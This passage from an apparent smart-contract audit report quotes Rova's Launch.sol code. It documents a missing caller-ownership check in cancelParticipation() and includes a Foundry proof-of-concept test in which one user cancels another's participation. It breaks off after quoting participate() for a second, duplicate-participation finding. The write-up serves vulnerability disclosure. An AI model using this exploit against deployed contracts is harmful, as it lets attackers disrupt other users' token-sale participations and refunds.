      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre></td><td class="rouge-code"><pre>    <span class="kd">function</span> <span class="nf">cancelParticipation</span><span class="p">(</span><span class="nx">CancelParticipationRequest</span> <span class="nx">calldata</span> <span class="nx">request</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">calldata</span> <span class="nx">signature</span><span class="p">)</span>
        <span class="nx">external</span>
        <span class="nx">nonReentrant</span>
        <span class="nx">whenNotPaused</span>
        <span class="nf">onlyLaunchGroupStatus</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">LaunchGroupStatus</span><span class="p">.</span><span class="nx">ACTIVE</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// Validate request is intended for this launch and unexpired</span>
        <span class="nf">_validateRequest</span><span class="p">(</span>
            <span class="nx">request</span><span class="p">.</span><span class="nx">launchId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">chainId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">requestExpiresAt</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">userAddress</span>
        <span class="p">);</span>
        <span class="c1">// Validate launch group is open for participation</span>
        <span class="nx">LaunchGroupSettings</span> <span class="nx">memory</span> <span class="nx">settings</span> <span class="o">=</span> <span class="nx">launchGroupSettings</span><span class="p">[</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">];</span>
        <span class="nf">_validateTimestamp</span><span class="p">(</span><span class="nx">settings</span><span class="p">);</span>
        <span class="c1">// Validate request signature is from signer role</span>
        <span class="nf">_validateRequestSignature</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">request</span><span class="p">)),</span> <span class="nx">signature</span><span class="p">);</span>

        <span class="nx">ParticipationInfo</span> <span class="nx">storage</span> <span class="nx">info</span> <span class="o">=</span> <span class="nx">launchGroupParticipations</span><span class="p">[</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">];</span>
        <span class="c1">// If launch group finalizes at participation, the participation is considered complete and not updatable</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">settings</span><span class="p">.</span><span class="nx">finalizesAtParticipation</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">revert</span> <span class="nc">ParticipationUpdatesNotAllowed</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">isFinalized</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">revert</span> <span class="nc">ParticipationUpdatesNotAllowed</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// Validate userId is the same which also checks if participation exists</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">userId</span> <span class="o">!=</span> <span class="nx">info</span><span class="p">.</span><span class="nx">userId</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">revert</span> <span class="nc">UserIdMismatch</span><span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">userId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// Get total tokens requested for user for launch group</span>
        <span class="nx">EnumerableMap</span><span class="p">.</span><span class="nx">Bytes32ToUintMap</span> <span class="nx">storage</span> <span class="nx">userTokens</span> <span class="o">=</span> <span class="nx">_userTokensByLaunchGroup</span><span class="p">[</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">];</span>
        <span class="p">(,</span> <span class="nx">uint256</span> <span class="nx">userTokenAmount</span><span class="p">)</span> <span class="o">=</span> <span class="nx">userTokens</span><span class="p">.</span><span class="nf">tryGet</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">userTokenAmount</span> <span class="o">-</span> <span class="nx">info</span><span class="p">.</span><span class="nx">tokenAmount</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// If total tokens requested for user is the same as the cancelled participation, remove user from launch group</span>
            <span class="nx">userTokens</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="nx">userTokenAmount</span> <span class="o">-</span> <span class="nx">info</span><span class="p">.</span><span class="nx">tokenAmount</span> <span class="o">&lt;</span> <span class="nx">settings</span><span class="p">.</span><span class="nx">minTokenAmountPerUser</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Total tokens requested for user after cancellation must be greater than min token amount per user</span>
            <span class="nx">revert</span> <span class="nc">MinUserTokenAllocationNotReached</span><span class="p">(</span>
                <span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">,</span> <span class="nx">userTokenAmount</span><span class="p">,</span> <span class="nx">info</span><span class="p">.</span><span class="nx">tokenAmount</span>
            <span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="c1">// Subtract cancelled participation token amount from total tokens requested for user</span>
            <span class="nx">userTokens</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">,</span> <span class="nx">userTokenAmount</span> <span class="o">-</span> <span class="nx">info</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// Transfer payment currency from contract to user</span>
        <span class="nx">uint256</span> <span class="nx">refundCurrencyAmount</span> <span class="o">=</span> <span class="nx">info</span><span class="p">.</span><span class="nx">currencyAmount</span><span class="p">;</span>
        <span class="nc">IERC20</span><span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">currency</span><span class="p">).</span><span class="nf">safeTransfer</span><span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">userAddress</span><span class="p">,</span> <span class="nx">refundCurrencyAmount</span><span class="p">);</span>

        <span class="c1">// Reset participation info</span>
        <span class="nx">info</span><span class="p">.</span><span class="nx">tokenAmount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nx">info</span><span class="p">.</span><span class="nx">currencyAmount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="nx">emit</span> <span class="nc">ParticipationCancelled</span><span class="p">(</span>
            <span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span>
            <span class="nx">request</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">,</span>
            <span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">,</span>
            <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span>
            <span class="nx">refundCurrencyAmount</span><span class="p">,</span>
            <span class="nx">info</span><span class="p">.</span><span class="nx">currency</span>
        <span class="p">);</span>
    <span class="p">}</span>
<span class="c1">// https://github.com/sherlock-audit/2025-02-rova-loptusKR/blob/main/rova-contracts/src/Launch.sol#L404L466</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the cancelParticipation() function is capable of canceling an existing participation, but because it doesn’t verify that the caller is the owner of the participation, it allows someone to forcibly cancel another user’s participation. due to the lack of identity verification in the cancelParticipation() function, a malicious user can cancel all existing participations</p>

<h3 id="poc-1"><span class="me-2">PoC</span><a href="#poc-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: GPL-3.0-only</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">22</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">PausableUpgradeable</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">LaunchTestBase</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">./LaunchTestBase.t.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Launch</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Launch.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span>
    <span class="nx">LaunchGroupSettings</span><span class="p">,</span>
    <span class="nx">LaunchGroupStatus</span><span class="p">,</span>
    <span class="nx">ParticipationRequest</span><span class="p">,</span>
    <span class="nx">ParticipationInfo</span><span class="p">,</span>
    <span class="nx">CancelParticipationRequest</span>
<span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Types.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">LaunchCancelParticipationTest</span> <span class="nx">is</span> <span class="nx">Test</span><span class="p">,</span> <span class="nx">Launch</span><span class="p">,</span> <span class="nx">LaunchTestBase</span> <span class="p">{</span>
    <span class="nx">LaunchGroupSettings</span> <span class="kr">public</span> <span class="nx">settings</span><span class="p">;</span>

    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nf">_setUpLaunch</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">test_CancelanotherUsersparticipation</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">settings</span> <span class="o">=</span> <span class="nf">_setupLaunchGroup</span><span class="p">();</span>
        <span class="nx">ParticipationRequest</span> <span class="nx">memory</span> <span class="nx">request</span> <span class="o">=</span> <span class="nf">_createParticipationRequest</span><span class="p">();</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">signature</span> <span class="o">=</span> <span class="nf">_signRequest</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">request</span><span class="p">));</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startPrank</span><span class="p">(</span><span class="nx">user1</span><span class="p">);</span>
        <span class="nx">currency</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span>
            <span class="nf">address</span><span class="p">(</span><span class="nx">launch</span><span class="p">),</span> <span class="nf">_getCurrencyAmount</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">currency</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">)</span>
        <span class="p">);</span>
        <span class="nx">launch</span><span class="p">.</span><span class="nf">participate</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">signature</span><span class="p">);</span>
        <span class="nx">ParticipationInfo</span> <span class="nx">memory</span> <span class="nx">info</span> <span class="o">=</span> <span class="nx">launch</span><span class="p">.</span><span class="nf">getParticipationInfo</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">User1's balance after participation : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">currency</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">user1</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">info.tokenAmount before ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">info</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">info.currencyAmount before ex: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">info</span><span class="p">.</span><span class="nx">currencyAmount</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopPrank</span><span class="p">();</span>

        <span class="c1">// User2 cancels their own participation.</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startPrank</span><span class="p">(</span><span class="nx">user2</span><span class="p">);</span>
        <span class="nx">CancelParticipationRequest</span> <span class="nx">memory</span> <span class="nx">cancelRequest</span> <span class="o">=</span> <span class="nc">CancelParticipationRequest</span><span class="p">({</span>
            <span class="na">chainId</span><span class="p">:</span> <span class="nx">block</span><span class="p">.</span><span class="nx">chainid</span><span class="p">,</span>
            <span class="na">launchId</span><span class="p">:</span> <span class="nx">testLaunchId</span><span class="p">,</span>
            <span class="na">launchGroupId</span><span class="p">:</span> <span class="nx">testLaunchGroupId</span><span class="p">,</span>
            <span class="na">launchParticipationId</span><span class="p">:</span> <span class="nx">testLaunchParticipationId</span><span class="p">,</span>
            <span class="na">userId</span><span class="p">:</span> <span class="nx">testUserId</span><span class="p">,</span>
            <span class="na">userAddress</span><span class="p">:</span> <span class="nx">user2</span><span class="p">,</span>
            <span class="na">requestExpiresAt</span><span class="p">:</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">+</span> <span class="mi">1</span> <span class="nx">hours</span>
        <span class="p">});</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">cancelSignature</span> <span class="o">=</span> <span class="nf">_signRequest</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">cancelRequest</span><span class="p">));</span>

        <span class="nx">launch</span><span class="p">.</span><span class="nf">cancelParticipation</span><span class="p">(</span><span class="nx">cancelRequest</span><span class="p">,</span> <span class="nx">cancelSignature</span><span class="p">);</span>

        <span class="nx">ParticipationInfo</span> <span class="nx">memory</span> <span class="nx">_info</span> <span class="o">=</span> <span class="nx">launch</span><span class="p">.</span><span class="nf">getParticipationInfo</span><span class="p">(</span><span class="nx">cancelRequest</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">User1's balance after user2 cancels their participation : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">currency</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">user1</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">info.tokenAmount after ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">_info</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">info.currencyAmount after ex: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">_info</span><span class="p">.</span><span class="nx">currencyAmount</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopPrank</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/2025/audit-feb/unauth-cancel.png" class="popup img-link  shimmer"><img src="/assets/img/2025/audit-feb/unauth-cancel.png" alt="" loading="lazy"></a></p>

<p>this is proof that user2 forcibly canceled user1’s participation</p>

<h2 id="rovam-02-fairess-disruption-due-to-duplicate-launch-participation"><span class="me-2">[Rova/M-02] Fairess disruption due to duplicate launch participation</span><a href="#rovam-02-fairess-disruption-due-to-duplicate-launch-participation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="root-cause-3"><span class="me-2">Root Cause</span><a href="#root-cause-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
</pre></td><td class="rouge-code"><pre>    <span class="kd">function</span> <span class="nf">participate</span><span class="p">(</span><span class="nx">ParticipationRequest</span> <span class="nx">calldata</span> <span class="nx">request</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">calldata</span> <span class="nx">signature</span><span class="p">)</span>
        <span class="nx">external</span>
        <span class="nx">nonReentrant</span>
        <span class="nx">whenNotPaused</span>
        <span class="nf">onlyLaunchGroupStatus</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">LaunchGroupStatus</span><span class="p">.</span><span class="nx">ACTIVE</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// Validate request is intended for this launch and unexpired</span>
        <span class="nf">_validateRequest</span><span class="p">(</span>
            <span class="nx">request</span><span class="p">.</span><span class="nx">launchId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">chainId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">requestExpiresAt</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">userAddress</span>
        <span class="p">);</span>
        <span class="nx">LaunchGroupSettings</span> <span class="nx">memory</span> <span class="nx">settings</span> <span class="o">=</span> <span class="nx">launchGroupSettings</span><span class="p">[</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">];</span>

        <span class="c1">// Validate launch group is open for participation</span>
        <span class="nf">_validateTimestamp</span><span class="p">(</span><span class="nx">settings</span><span class="p">);</span>

        <span class="c1">// Validate request signature is from signer role</span>
        <span class="nf">_validateRequestSignature</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">request</span><span class="p">)),</span> <span class="nx">signature</span><span class="p">);</span>

        <span class="c1">// Validate payment currency is enabled for launch group</span>
        <span class="nx">uint256</span> <span class="nx">tokenPriceBps</span> <span class="o">=</span> <span class="nf">_validateCurrency</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">currency</span><span class="p">);</span>

        <span class="c1">// Do not allow replay of launch participation ID</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">launchGroupParticipations</span><span class="p">[</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">].</span><span class="nx">userId</span> <span class="o">!=</span> <span class="nf">bytes32</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">revert</span> <span class="nc">ParticipationAlreadyExists</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// If launch group does not finalize at participation, users should perform updates instead</span>
        <span class="c1">// This is checked by checking if the user has already requested tokens under the launch group</span>
        <span class="nx">EnumerableMap</span><span class="p">.</span><span class="nx">Bytes32ToUintMap</span> <span class="nx">storage</span> <span class="nx">userTokens</span> <span class="o">=</span> <span class="nx">_userTokensByLaunchGroup</span><span class="p">[</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">];</span>
        <span class="p">(,</span> <span class="nx">uint256</span> <span class="nx">userTokenAmount</span><span class="p">)</span> <span class="o">=</span> <span class="nx">userTokens</span><span class="p">.</span><span class="nf">tryGet</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">userTokenAmount</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">settings</span><span class="p">.</span><span class="nx">finalizesAtParticipation</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">revert</span> <span class="nc">MaxUserParticipationsReached</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="c1">// Validate user requested token amount is within launch group user allocation limits</span>
        <span class="nx">uint256</span> <span class="nx">newUserTokenAmount</span> <span class="o">=</span> <span class="nx">userTokenAmount</span> <span class="o">+</span> <span class="nx">request</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">;</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">newUserTokenAmount</span> <span class="o">&gt;</span> <span class="nx">settings</span><span class="p">.</span><span class="nx">maxTokenAmountPerUser</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">revert</span> <span class="nc">MaxUserTokenAllocationReached</span><span class="p">(</span>
                <span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">,</span> <span class="nx">userTokenAmount</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">tokenAmount</span>
            <span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">newUserTokenAmount</span> <span class="o">&lt;</span> <span class="nx">settings</span><span class="p">.</span><span class="nx">minTokenAmountPerUser</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">revert</span> <span class="nc">MinUserTokenAllocationNotReached</span><span class="p">(</span>
                <span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">,</span> <span class="nx">userTokenAmount</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">tokenAmount</span>
            <span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// Calculate payment amount in requested currency based on token price and requested token amount</span>
        <span class="nx">uint256</span> <span class="nx">currencyAmount</span> <span class="o">=</span> <span class="nf">_calculateCurrencyAmount</span><span class="p">(</span><span class="nx">tokenPriceBps</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">);</span>

        <span class="c1">// Store participation info for user</span>
        <span class="nx">ParticipationInfo</span> <span class="nx">storage</span> <span class="nx">info</span> <span class="o">=</span> <span class="nx">launchGroupParticipations</span><span class="p">[</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">];</span>

        <span class="c1">// If launch group finalizes at participation, the participation is considered complete and not updatable</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">settings</span><span class="p">.</span><span class="nx">finalizesAtParticipation</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Validate launch group max token allocation has not been reached</span>
            <span class="p">(,</span> <span class="nx">uint256</span> <span class="nx">currTotalTokensSold</span><span class="p">)</span> <span class="o">=</span> <span class="nx">_tokensSoldByLaunchGroup</span><span class="p">.</span><span class="nf">tryGet</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">settings</span><span class="p">.</span><span class="nx">maxTokenAllocation</span> <span class="o">&lt;</span> <span class="nx">currTotalTokensSold</span> <span class="o">+</span> <span class="nx">request</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">revert</span> <span class="nc">MaxTokenAllocationReached</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// Update total withdrawable amount for payment currency</span>
            <span class="p">(,</span> <span class="nx">uint256</span> <span class="nx">withdrawableAmount</span><span class="p">)</span> <span class="o">=</span> <span class="nx">_withdrawableAmountByCurrency</span><span class="p">.</span><span class="nf">tryGet</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">currency</span><span class="p">);</span>
            <span class="nx">_withdrawableAmountByCurrency</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">currency</span><span class="p">,</span> <span class="nx">withdrawableAmount</span> <span class="o">+</span> <span class="nx">currencyAmount</span><span class="p">);</span>
            <span class="c1">// Mark participation as finalized</span>
            <span class="nx">info</span><span class="p">.</span><span class="nx">isFinalized</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
            <span class="c1">// Update total tokens sold for launch group</span>
            <span class="nx">_tokensSoldByLaunchGroup</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">currTotalTokensSold</span> <span class="o">+</span> <span class="nx">request</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">// Set participation details for user</span>
        <span class="nx">info</span><span class="p">.</span><span class="nx">userAddress</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
        <span class="nx">info</span><span class="p">.</span><span class="nx">userId</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">;</span>
        <span class="nx">info</span><span class="p">.</span><span class="nx">tokenAmount</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">;</span>
        <span class="nx">info</span><span class="p">.</span><span class="nx">currencyAmount</span> <span class="o">=</span> <span class="nx">currencyAmount</span><span class="p">;</span>
        <span class="nx">info</span><span class="p">.</span><span class="nx">currency</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">currency</span><span class="p">;</span>

        <span class="c1">// Update total tokens requested for user for launch group</span>
        <span class="nx">userTokens</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">,</span> <span class="nx">newUserTokenAmount</span><span class="p">);</span>
        <span class="c1">// Transfer payment currency from user to contract</span>
        <span class="nc">IERC20</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">currency</span><span class="p">).</span><span class="nf">safeTransferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">currencyAmount</span><span class="p">);</span>

        <span class="nx">emit</span> <span class="nc">ParticipationRegistered</span><span class="p">(</span>
            <span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span>
            <span class="nx">request</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">,</span>
            <span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">,</span>
            <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span>
            <span class="nx">currencyAmount</span><span class="p">,</span>
            <span class="nx">request</span><span class="p">.</span><span class="nx">currency</span>
        <span class="p">);</span>
    <span class="p">}</span>
<span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/dpm-labs/rova-contracts/blob/main/src/Launch.sol#L215L305</span>
</pre></td></tr></tbody></table></code></div></div>
